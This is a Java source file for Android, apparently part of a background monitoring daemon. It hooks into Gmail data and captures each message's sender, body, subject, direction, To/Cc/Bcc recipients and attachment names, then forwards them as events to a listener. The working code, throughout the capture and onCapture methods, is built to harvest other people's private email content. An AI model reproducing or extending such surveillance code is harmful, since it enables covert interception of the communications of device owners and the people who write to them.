package com.vvt.daemon.email;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import android.content.Context;

import com.vvt.base.FxEvent;
import com.vvt.base.FxEventListener;
import com.vvt.events.FxAttachment;
import com.vvt.events.FxEmailEvent;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxRecipient;
import com.vvt.events.FxRecipientType;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.exceptions.FxOperationNotAllowedException;
import com.vvt.logger.FxLog;

public class FxGmailCapture implements GmailObserver.OnCaptureListener {

	private static final String TAG = "FxEmailCapture";
	public static final String DATE_FORMAT = "dd/MM/yy HH:mm:ss";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	
	private Context mContext;
	private String mWritablepath;
	private GmailCapturingManager mGmailCapturingManager;
	private FxEventListener mFxEventListner;
	private boolean mIsWorking;
	
	public FxGmailCapture(Context context, String writablePath) {
		mContext = context;
		mWritablepath = writablePath;
		mIsWorking  = false;
	}
	
	public void register(FxEventListener eventListner) {
		if(LOGV) FxLog.v(TAG, "register # ENTER ...");
		this.mFxEventListner = eventListner;
		
		if(LOGV) FxLog.v(TAG, "register # EXIT ...");
	}
	
	public void unregister() throws FxOperationNotAllowedException {
		if(LOGV) FxLog.v(TAG, "unregister # ENTER ...");
		if(!mIsWorking) {
			//set the eventhandler to null to avoid memory leaks
			mFxEventListner = null;
		} else {
			throw new FxOperationNotAllowedException("Capturing is working, please call stopCapture before unregister.");
		}
		if(LOGV) FxLog.v(TAG, "unregister # EXIT ...");
	}
	
	public void startCapture() throws FxNullNotAllowedException {
		if(LOGV) FxLog.v(TAG, "startObserver # ENTER ...");
		if(mFxEventListner == null)
			throw new FxNullNotAllowedException("eventListner can not be null");
		
		if (mContext == null)
			throw new FxNullNotAllowedException("Context context can not be null");
		
		if (mWritablepath == null || mWritablepath == "")
			throw new FxNullNotAllowedException("Writablepath context can not be null or empty");
		
		if (!mIsWorking) {
			mIsWorking = true;
			if(LOGD) FxLog.d(TAG, "startObserver # starting observer .... ");
			mGmailCapturingManager = GmailCapturingManager.getInstance(mContext);
			mGmailCapturingManager.setLoggablePath(mWritablepath);
			mGmailCapturingManager.setDateFormat(DATE_FORMAT);
			mGmailCapturingManager.registerObserver(this);
		}
		if(LOGV) FxLog.v(TAG, "startObserver # EXIT ...");
	}
	
	public void stopCapture() {
		if(mGmailCapturingManager != null) {
			mGmailCapturingManager.unregisterObserver();
			mIsWorking = false;
		}
	}
	
	@Override
	public void onCapture(ArrayList<GmailData> gmails) {
		if(LOGV) FxLog.v(TAG, "onCapture # ENTER ...");
		List<FxEvent> events = new ArrayList<FxEvent>();
		FxEmailEvent event =null;

		
		for (GmailData gmail : gmails) {
			
			FxEventDirection direction = gmail.isInbox() ? 
					FxEventDirection.IN : FxEventDirection.OUT;
			
			String contactName = gmail.getReciverContactName();
			
			if (contactName == null || contactName.trim().length() < 1) {
				contactName = "unknown";
			} else {
				contactName = contactName.replace("[", "");
				contactName = contactName.replace("]", "");
				contactName = contactName.trim();
			}
			
			event = new FxEmailEvent();
			event.setEventTime(gmail.getTime());
			event.setDirection(direction);
			event.setSenderEMail(gmail.getSender());
			event.setEMailBody(gmail.getBody());
			event.setSubject(gmail.getSubject());
			event.setSenderContactName(gmail.getSenderName());
			
			FxRecipient recipient = new FxRecipient();
			if (direction == FxEventDirection.OUT){
				ArrayList<String> emails = new ArrayList<String>();
				emails.addAll(Arrays.asList(gmail.getTo()));
				emails.addAll(Arrays.asList(gmail.getCc()));
				emails.addAll(Arrays.asList(gmail.getBcc()));
				
				String recipientUid = emails.toString();
				recipientUid = recipientUid.replace("[", "");
				recipientUid = recipientUid.replace("]", "");
				recipientUid = recipientUid.trim();
				
				recipient.setContactName(contactName);
				recipient.setRecipient(recipientUid);
				recipient.setRecipientType(FxRecipientType.TO);
				event.addRecipient(recipient);
				
				if(LOGV) FxLog.v(TAG, recipient.toString());
				
			}
			
			FxAttachment attachment = null;
			String[] attachments = gmail.getAttachments();
			for(int i = 0 ; i< attachments.length ; i++) {
				attachment = new FxAttachment();
				attachment.setAttachemntFullName(attachments[i]);
				attachment.setAttachmentData(new byte[]{});
				event.addAttachment(attachment); 
			}
			
//			FxAttachment attachment = null;
//			List<GmailAttachment> attachments = gmail.getGmailAttachments();
//			FxLog.v(TAG, "onCapture # attachments.count : " + attachments.size());
//			for(int i = 0 ; i< attachments.size() ; i++) {
//				attachment = new FxAttachment();
//				attachment.setAttachemntFullName(attachments.get(i).getAttachmentFullName());
//				attachment.setAttachmentData(attachments.get(i).getAttachmentData());
//				event.addAttachment(attachment);
//			}
			
			events.add(event);
			
		}
		if(LOGV) FxLog.v(TAG, "onCapture # EXIT ...");
		this.mFxEventListner.onEventCaptured(events); 
	}
	
}
